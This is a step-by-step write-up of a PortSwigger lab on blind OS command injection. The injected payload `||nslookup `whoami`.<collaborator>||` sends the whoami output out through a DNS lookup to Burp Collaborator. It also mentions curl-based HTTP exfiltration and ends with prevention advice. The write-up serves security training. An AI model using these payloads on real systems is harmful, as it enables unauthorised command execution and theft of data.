# Command Injection - Lab #5: Blind OS Command Injection with Out-of-Band Data Exfiltration

**YouTube Tutorial:** [Blind OS command injection with out-of-band data exfiltration](https://youtu.be/oAYwt19DlGw?si=YElvF_ZWVdl13QaZ)

---

## 1. What is Blind OS Command Injection with Out-of-Band Data Exfiltration?

### Core Concept

Lab #4 proved that an injected command *executed* by triggering a bare DNS lookup to Burp Collaborator — but that only confirms execution, it doesn't tell you anything about the target. This lab goes one step further: instead of just pinging Collaborator to say "I ran," the injected command **runs `whoami`, then embeds its output into the DNS lookup itself** — so the attacker can literally read the command's result out of the DNS query.

```
            INJECTION (command chained into DNS)          OUT-OF-BAND EXFILTRATION
   ┌────────────────────────────┐          ┌────────────────────────────┐
   │  email = ||nslookup+        │          │  Attacker's Burp           │
   │  `whoami`.BURP-COLLAB-      │          │  Collaborator server       │
   │  ORATOR-SUBDOMAIN||         │          │  sees DNS lookup for:      │
   └─────────────┬──────────────┘          │  peter.<subdomain>         │
                 ▼                          └─────────────▲──────────────┘
   ┌────────────────────────────┐                        │
   │  Shell executes:            │                        │
   │  whoami  →  "peter"          │                        │
   │  nslookup peter.<subdomain> │────────────────────────┘
   │  (async, no response impact)│   DNS lookup carries the
   └─────────────┬──────────────┘   command output as a
                 ▼                   subdomain label
   ┌────────────────────────────┐
   │  HTTP Response: unchanged,  │
   │  no output visible          │
   │  = still fully blind        │
   └────────────────────────────┘
```

The **subdomain of the DNS lookup itself becomes the exfiltration channel** — Burp Collaborator logs the exact hostname queried, and the command's output is sitting right there as the leftmost label.

---

## 2. Attack Overview & Key Concepts

### Vulnerability Explanation

* **Vulnerable Feature:** The **feedback form** (Submit feedback) — same fields as the earlier labs: `name`, `email`, `subject`, `message`.
* **Vulnerable Parameter:** `email`, consistent with Labs #2–#4.
* **Blind Command Injection Mechanism:** Same asynchronous, response-blind execution as Lab #4 — <cite index="26-1">to solve the lab, execute the whoami command and exfiltrate the output via a DNS query to Burp Collaborator.</cite>
* **Detection & Exfiltration Channel:** A single DNS lookup that both confirms execution *and* carries data — <cite index="25-1">the nslookup command causes a DNS lookup for a Collaborator subdomain, and this lookup will contain the result of the whoami command.</cite>
* **Tooling requirement:** Like Lab #4, this needs <cite index="26-1">Burp Suite Professional</cite> to intercept and modify the request.
* **End Goal:** <cite index="26-1">Execute the whoami command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab.</cite>

### Root Cause & Impact

* **Root Cause:** Same unsanitized shell concatenation as the rest of the series, combined with command substitution (backticks) letting the attacker embed one command's output inside another command's arguments.
* **Impact:** This demonstrates that OOB channels aren't limited to yes/no confirmation — command substitution turns a DNS lookup into a generic exfiltration primitive. Any command whose output fits in a DNS label (hostnames, usernames, short file contents, environment variables) can be leaked this way, even when there's zero visibility in the HTTP response and no writable web-servable directory.

---

## 3. Attack Methods & Techniques (4-Phase Analysis)

* **Phase 1 — Confirm Blind Command Injection (OOB):** Repeat Lab #4's bare DNS-lookup test first, to re-confirm the injection point and that Collaborator is reachable, before attempting exfiltration.
* **Phase 2 — Set Up the Burp Collaborator Listener:** Generate a fresh Collaborator subdomain, same as Lab #4.
* **Phase 3 — Redirect Command Output into the DNS Lookup:** Use command substitution (`` `whoami` ``) to embed the command's output as a subdomain label in the `nslookup` payload.
* **Phase 4 — Check Collaborator for the Exfiltrated Output:** Poll Collaborator and read the leaked username directly out of the logged DNS interaction.

### Server Behavior

* **Feedback submission response:** Always identical — no delay, no output, no visible change, exactly like Lab #4.
* **Successful injection:** A DNS interaction appears in Collaborator whose queried hostname is prefixed with the actual output of `whoami` (e.g. `peter.<subdomain>`), leaking data purely through the DNS query itself.

---

## 4. Step-by-Step Walkthrough

### Step 1: Intercept the Feedback Submission Request

1. In the lab, click **"Submit feedback"** and fill the form with dummy values:

```
Name:      test
Email:     test@example.com
Subject:   test
Message:   test
```

2. Submit the form with **Burp Proxy interception ON**.
3. Send the captured `POST /feedback/submit` request to **Repeater**.

```http
POST /feedback/submit HTTP/1.1
Host: [LAB-ID].web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Cookie: session=[SESSION-COOKIE]

csrf=[CSRF-TOKEN]&name=test&email=test%40example.com&subject=test&message=test
```

### Step 2 — Phase 1: Confirm Blind Command Injection (OOB)

Before trying to exfiltrate data, re-confirm the injection point responds to an out-of-band probe, exactly as in Lab #4:

```http
email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
```

Send it, poll Collaborator, and confirm a bare DNS interaction arrives. This tells you the `email` parameter is injectable and that outbound DNS from the target reaches your Collaborator server before you build the more complex exfiltration payload.

### Step 3 — Phase 2: Set Up the Burp Collaborator Listener

1. In Burp Suite Professional, go to the **Collaborator** tab.
2. <cite index="26-1">Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.</cite>
3. Keep the Collaborator tab open and ready to poll after sending the exfiltration payload.

### Step 4 — Phase 3: Redirect Command Output into the DNS Lookup

<cite index="26-1">Modify the email parameter, changing it to something like the following, but insert your Burp Collaborator subdomain where indicated: email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||</cite>. As before, right-click the payload and use **Insert Collaborator payload** to drop in your actual subdomain rather than typing it by hand.

```http
POST /feedback/submit HTTP/1.1
Host: [LAB-ID].web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Cookie: session=[SESSION-COOKIE]

csrf=[CSRF-TOKEN]&name=test&email=||nslookup+`whoami`.abcdefghij1234567890.oastify.com||&subject=test&message=test
```

* **Injected payload:** `` ||nslookup `whoami`.<BURP-COLLABORATOR-SUBDOMAIN>|| ``
* **Why it works:** The backticks trigger **command substitution** — the shell runs `whoami` first, captures its stdout (e.g. `peter`), and splices that text directly into the `nslookup` argument before executing it. The resulting DNS query is literally `peter.<subdomain>`, so the username travels to Collaborator as part of the hostname being resolved.
* Send the request. As with every lab in this series, the HTTP response itself gives no indication of success.

### Step 5 — Phase 4: Check Collaborator for the Exfiltrated Output

1. <cite index="26-1">Go back to the Collaborator tab, and click "Poll now". You should see some DNS interactions that were initiated by the application as the result of your payload.</cite>
2. Click the new interaction and open its **Description** tab.
3. **Result:** The full domain name that was looked up is shown, with the command output as its leftmost label (e.g. `peter.<subdomain>`) — this is the exfiltrated `whoami` result.
4. Enter that username into the lab's solve field (the lab specifically <cite index="26-1">requires you to enter the name of the current user to complete the lab</cite>).
5. The lab banner updates to **"Congratulations, you solved the lab!"**.

---

## 5. Pro-Tips & Common Pitfalls

* **Requires Burp Suite Professional, same as Lab #4:** <cite index="24-1">Burp Suite Professional is required to solve this lab!</cite> — the Community Edition's Collaborator client isn't available.
* **Command substitution syntax matters:** Backticks (`` `whoami` ``) and `$(whoami)` both perform command substitution in most POSIX shells — if one is stripped or mangled by the target's parsing, try the other.
* **Interactions may not be instant:** <cite index="25-1">The command may be executed after a delay. The Collaborator tab flashes when an interaction occurs</cite> — don't assume failure if nothing appears within the first second or two; poll again after a short wait.
* **Always use "Insert Collaborator payload":** As with Lab #4, right-click in Repeater and let Burp insert the tracked subdomain rather than copy-pasting it manually, so Burp correctly associates the interaction back to this specific request.
* **DNS labels have length/character limits:** This technique works cleanly for short outputs like a username. Longer or binary output may need to be chunked, base64-encoded, or exfiltrated via HTTP instead of DNS — a technique some real-world payloads extend to (e.g. piping base64-encoded output through `curl` to an attacker-controlled HTTP endpoint).
* **Firewall restrictions on Academy labs:** As with Lab #4, PortSwigger's firewall blocks interactions between labs and arbitrary external systems — <cite index="26-1">to solve the lab, you must use Burp Collaborator's default public server,</cite> not a self-hosted one.
* **The vulnerable backend pattern:**

```php
// ❌ VULNERABLE — blind, asynchronous, zero visible output;
// still exploitable because outbound DNS is unrestricted
exec("mail " . $email . " ...");  // fire-and-forget, output discarded

// ✅ SAFE — avoid shell calls entirely; use a mail library with native APIs,
// and block/restrict outbound DNS and HTTP from execution environments
```

* **Prevention summary:**
  * Never call OS commands from application code; use native APIs/libraries instead.
  * Restrict outbound network access (DNS and HTTP) from application/execution servers — this is the control that would have prevented the exfiltration entirely, not just the injection.
  * If shell calls are unavoidable, use argument-array APIs (no shell) plus strict allow-list validation of every field, and never allow command substitution syntax to reach a shell.
  * Monitor DNS query logs from application infrastructure for anomalous subdomains or high-entropy hostnames — a common sign of exactly this kind of exfiltration.